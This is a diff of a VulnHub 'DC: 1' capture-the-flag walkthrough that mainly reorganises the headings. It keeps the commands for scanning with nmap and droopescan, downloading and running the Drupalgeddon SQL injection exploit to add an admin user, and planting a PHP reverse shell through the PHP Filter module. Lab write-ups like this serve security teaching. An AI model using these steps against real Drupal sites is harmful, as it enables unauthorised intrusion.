@@ -35,7 +35,7 @@ flag only.
 
 ## Walkthrough
 ### nmap
-We begin with a pretty basic `nmap` scan to see what we're dealing with
+We begin with a pretty basic `nmap` scan to see what we're dealing with.
 
 ```
 $ nmap -sC -sV 192.168.2.111
@@ -72,13 +72,16 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 We have `SSH` on Port 22, `HTTP` on Port 80 and `RPC` on Port 111.
 
-### HTTP
+### Drupal
 Taking a look at the HTTP, we are greeted with a Drupal website.
 
 ![Drupal - Homepage][Drupal - Homepage]
 
-Other than a login box, there is nothing helpful here; no version number, posts or such. As a result we'll use 
-`droopescan` to find any info we can on the CMS.
+Other than a login box, there is nothing helpful here; no version number, posts or such. As a result we have to gather 
+more information regarding the system.
+
+### Reconning and Exploiting Drupal
+To gather information on Drupal, we'll use [droopescan][Droopescan].
 
 ```
 $ pip install droopescan
@@ -110,31 +113,30 @@ $ droopescan scan drupal -u 192.168.2.111
     php http://192.168.2.111/modules/php/
 ```
 
-`droopescan` found us several possible versions for Drupal. With that in mind we'll use `searchsploit` to find any 
-known exploits we can use to gain admin access to the page.
+`droopescan` found us several possible versions for Drupal but once thing is certain; it's `7.2x`. With that in mind, 
+we'll search `searchsploit` to find any known exploits we can use to gain admin access. There are over 40 known 
+exploits regarding Drupal, but the most relevant 6 are displayed above. The most useful among those 6 is 
+`Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)`; which adds an admin user via SQL injection. Since 
+our version is `7.2x` this exploit will work on our version of Drupal.
 
 ```
 $ searchsploit Drupal
 
-------------------------------------------------------------------------------- ----------------------------------------
-Exploit Title                                                                  |  Path
-                                                                               | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------- ----------------------------------------
+-------------------------------------------------------------------------------
+Exploit Title
+
+-------------------------------------------------------------------------------
 [...]
 
-Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)              | exploits/php/webapps/34992.py
-Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)               | exploits/php/webapps/44355.php
-Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)    | exploits/php/webapps/34984.py
-Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)    | exploits/php/webapps/34993.php
-Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)       | exploits/php/webapps/35150.php
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)
 
 [...] 
-------------------------------------------------------------------------------- ----------------------------------------
+-------------------------------------------------------------------------------
 ```
-
-There are over 40 known exploits regarding Drupal, but the most relevant 6 are displayed above. The most useful among 
-those 6 is `34992`; which adds an admin user via SQL injection. Since our version is `7.2x` this exploit will work on 
-our version of Drupal.
 
 ```
 $ wget https://www.exploit-db.com/download/34992
@@ -167,6 +169,7 @@ $ python2 34992 -t http://192.168.2.111 -u Arszilla -p password
 [*] Url: http://192.168.2.111/?q=node&destination=node
 ```
 
+### Getting a Reverse Shell
 We've added `Arszilla` as an admin user with the password `password`. Once logging in we can see the posts, modules 
 and other admin only content. By accessing `Modules` we can see currently installed modules and in that list we can 
 see `PHP Filter`; which is disabled. After enabling it we edit its permissions it and allow `Administrator` to use it. 
@@ -192,6 +195,7 @@ $ whoami
 www-data
 ```
 
+### Logging in as Root
 Now that we have a reverse shell, our first task will be to spawn a proper shell and then find any and all 
 vulnerabilities in the system to login as `root` and access `/root`. We'll use `python` to import `pty` to spawn a 
 proper shell and then use [LinEnum][LinEnum] to scan the system.
@@ -262,6 +266,7 @@ Thus, we've gained captured the `root` flag in DC: 1.
 [DCAU]:                         https://twitter.com/DCAU7
 [Mr. Robot]:                    https://www.vulnhub.com/entry/mr-robot-1,151/
 [Drupal - Homepage]:            /images/posts/2019-07-09-vulnhub-dc_1/Drupal%20-%20Homepage.png
+[Droopescan]:                   https://github.com/droope/droopescan
 [PHP Reverse Shell]:            http://pentestmonkey.net/tools/web-shells/php-reverse-shell
 [pentestmonkey]:                http://pentestmonkey.net/
 [Drupal - PHP Reverse Shell]:   /images/posts/2019-07-09-vulnhub-dc_1/Drupal%20-%20PHP%20Reverse%20Shell.png
